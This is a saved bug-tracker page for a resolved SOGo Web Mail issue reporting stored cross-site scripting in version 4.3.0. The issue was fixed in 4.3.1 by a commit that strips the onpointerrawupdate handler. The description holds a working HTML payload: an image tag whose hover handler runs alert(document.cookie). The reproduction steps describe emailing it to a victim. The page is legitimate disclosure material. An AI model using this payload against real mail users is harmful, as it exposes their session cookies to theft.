=== Content from sogo.nu_f0525c79_20250119_113207.html ===


Toggle sidebar [SOGo | BTS](/my_view_page.php) Toggle user menu

* SOGo

  + - [All Projects](/set_project.php?project_id=0)
    - [SOGo](/set_project.php?project_id=1)
    - [SOGo Connector](/set_project.php?project_id=2)
    - [SOGo Integrator](/set_project.php?project_id=3)
* guest
  + [RSS](https://bugs.sogo.nu/issues_rss.php)
  + [Logout](/logout_page.php)

* [Main](/main_page.php)
* [My View](/my_view_page.php)
* [View Issues](/view_all_bug_page.php)
* [Change Log](/changelog_page.php)
* [Roadmap](/roadmap_page.php)
* [Repositories](/plugin.php?page=Source/index)

* Anonymous
[Login](/login_page.php?return=%2Fview.php%3Fid%3D4979)
[Signup for a new account](/signup_page.php)

#### View Issue Details

[Related Changesets](#changesets)[Jump to Notes](#bugnotes)[Jump to History](#history)

|  | | | | | |
| --- | --- | --- | --- | --- | --- |
| ID | Project | Category | View Status | Date Submitted | Last Update |
| --- | --- | --- | --- | --- | --- |
| 0004979 | SOGo | Web Mail | public | 2020-03-06 06:12 | 2020-03-06 17:17 |
|  | | | | | |
|
| Reporter | [tzrj](https://bugs.sogo.nu/view_user_page.php?id=2907) | Assigned To | [francis](https://bugs.sogo.nu/view_user_page.php?id=2) |  | |
| Priority | high | Severity | major | Reproducibility | N/A |
| Status | resolved | Resolution | fixed |  | |
| Product Version | 4.3.0 |  | | | |
| Fixed in Version | 4.3.1 |  | | | |
|  | | | | | |
|
| Summary | 0004979: Stored XSS in Web Mail | | | | |
| Description | Stored XSS at Web Mail (Works on Chrome Latest) Payload: <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNTgwIiBoZWlnaHQ9IjQwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KIDxnPgogIDxyZWN0IGZpbGw9IiNmZmYiIGlkPSJjYW52YXNfYmFja2dyb3VuZCIgaGVpZ2h0PSI0MDIiIHdpZHRoPSI1ODIiIHk9Ii0xIiB4PSItMSIvPgogIDxnIGRpc3BsYXk9Im5vbmUiIG92ZXJmbG93PSJ2aXNpYmxlIiB5PSIwIiB4PSIwIiBoZWlnaHQ9IjEwMCUiIHdpZHRoPSIxMDAlIiBpZD0iY2FudmFzR3JpZCI+CiAgIDxyZWN0IGZpbGw9InVybCgjZ3JpZHBhdHRlcm4pIiBzdHJva2Utd2lkdGg9IjAiIHk9IjAiIHg9IjAiIGhlaWdodD0iMTAwJSIgd2lkdGg9IjEwMCUiLz4KICA8L2c+CiA8L2c+CiA8Zz4KIDwvZz4KPC9zdmc+" onpointerrawupdate="alert(document.cookie);" /> | | | | |
| Steps To Reproduce | Send mail to mailbox using SOGo Web Mail with the payload When the victim passes the picture with the mouse, an alert will fire with cookies | | | | |
| Tags | No tags attached. | | | | |
|  | | | | | |
|

#### Activities

| There are no notes attached to this issue. | |
| --- | --- |

#### Related Changesets

| sogo: master d1dbceb4  2020-03-06 12:14  [francis](https://bugs.sogo.nu/view_user_page.php?id=2) [Details](/plugin.php?page=Source/view&id=4613) [Diff](https://github.com/Alinto/sogo/commit/d1dbceb407b37aff6563d06194189965af39cf3e) | fix(mail): remove onpointerrawupdate event handler from HTML messages | | Affected Issues[0004979](/view.php?id=4979 "[resolved] Stored XSS in Web Mail") |
| --- | --- | --- | --- |
| mod - UI/MailPartViewers/UIxMailPartHTMLViewer.m | | [Diff](https://github.com/Alinto/sogo/commit/d1dbceb407b37aff6563d06194189965af39cf3e) [File](https://github.com/Alinto/sogo/blob/d1dbceb407b37aff6563d06194189965af39cf3e/UI/MailPartViewers/UIxMailPartHTMLViewer.m) |
| mod - UI/Templates/MailerUI/UIxMailEditor.wox | | [Diff](https://github.com/Alinto/sogo/commit/d1dbceb407b37aff6563d06194189965af39cf3e) [File](https://github.com/Alinto/sogo/blob/d1dbceb407b37aff6563d06194189965af39cf3e/UI/Templates/MailerUI/UIxMailEditor.wox) |
| mod - UI/WebServerResources/js/Common/sgAutogrow.directive.js | | [Diff](https://github.com/Alinto/sogo/commit/d1dbceb407b37aff6563d06194189965af39cf3e) [File](https://github.com/Alinto/sogo/blob/d1dbceb407b37aff6563d06194189965af39cf3e/UI/WebServerResources/js/Common/sgAutogrow.directive.js) |

#### Issue History

| Date Modified | Username | Field | Change |
| --- | --- | --- | --- |
| 2020-03-06 06:12 | [tzrj](https://bugs.sogo.nu/view_user_page.php?id=2907) | New Issue |  |
| 2020-03-06 17:16 | [francis](https://bugs.sogo.nu/view_user_page.php?id=2) | Changeset attached | => sogo master d1dbceb4 |
| 2020-03-06 17:16 | [francis](https://bugs.sogo.nu/view_user_page.php?id=2) | Assigned To | => francis |
| 2020-03-06 17:16 | [francis](https://bugs.sogo.nu/view_user_page.php?id=2) | Resolution | open => fixed |
| 2020-03-06 17:17 | [francis](https://bugs.sogo.nu/view_user_page.php?id=2) | Status | new => resolved |
| 2020-03-06 17:17 | [francis](https://bugs.sogo.nu/view_user_page.php?id=2) | Fixed in Version | => 4.3.1 |

**Powered by [MantisBT](https://www.mantisbt.org "bug tracking software")**

Copyright Â© 2000 - 2025 MantisBT Team
Contact administrator for assistance

[![Powered by Mantis Bug Tracker: a free and open source web based bug tracking system.](/images/mantis_logo.png)](https://www.mantisbt.org "Mantis Bug Tracker: a free and open source web based bug tracking system.")


